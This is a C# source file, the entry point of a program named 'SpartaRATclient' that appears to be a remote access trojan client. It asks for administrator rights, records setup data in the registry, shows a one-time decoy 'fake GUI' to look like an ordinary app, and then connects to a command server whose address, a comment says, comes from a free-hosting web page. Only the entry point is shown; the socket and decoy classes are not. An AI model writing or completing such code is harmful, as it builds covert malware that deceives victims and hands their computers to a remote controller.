using System;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using SpartaRATclient.FakeProgram;
using SpartaRATclient.Setup.OSType;
using SpartaRATclient.Setup.PrivilegeCheck;

namespace SpartaRATclient
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            StartProgram();
            
            void StartProgram()
            {
                //creates registry value for App opening date and OS type
                //starts fake GUI app if first time program opened
                Run.ProgramSetup();

                //creates an instance of SocketClient class which trigger constructor
                SocketClientClass SocketClient = new SocketClientClass();

                //SocketClient instance connecting to server (ipaddress comes from https://mysimpleweb054.000webhostapp.com/mysite/detail)
                SocketClient.Connect();
            }
        }
    }






    public class Run
    {
        public static void ProgramSetup()
        {
            //Notice: This program registry path is HKEY_CURRENT_USER\Software\ClientValues
            //ClientValues - The registry key of this app

            RegistryData data = new RegistryData();
            GetPrivilege app = new GetPrivilege();

            if (!data.CheckIfRegistryDataExist("OpenedAt"))
            {
                //The only way for this data to be exist is if this program was already opened.
                //So, if this already exist this if is not relevant.
                //THIS IS A IF FOR THE FIRST TIME PROGRAM OPENED

                if (app.GetAdminPrivileges())
                {
                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\ClientValues"))
                    {
                        key.SetValue("OpenedAt", DateTime.Now);
                        OSTypes OS = new OSTypes();
                        key.SetValue("OsVersion", OS.Type());
                    }
                    //When program gets privileges it will reopen as admin
                    //So i am closing this app because there is other app opened as admin
                    Environment.Exit(0);
                }
                else
                {
                    MessageBox.Show("Error: You must run this app as Administrator.");
                    Environment.Exit(0);
                }
            }

            //If "FirstOpen" registry data not exist, its the first time program opened.
            //the Fake GUI will open, only once in life.
            if (!data.CheckIfRegistryDataExist("FirstOpen"))
            {
                data.CreateRegistryData("FirstOpen", "0");
                Form1 form = new Form1();
                new Thread(new ThreadStart(() => { form.ShowDialog(); })).Start();
            }
        }
    }
}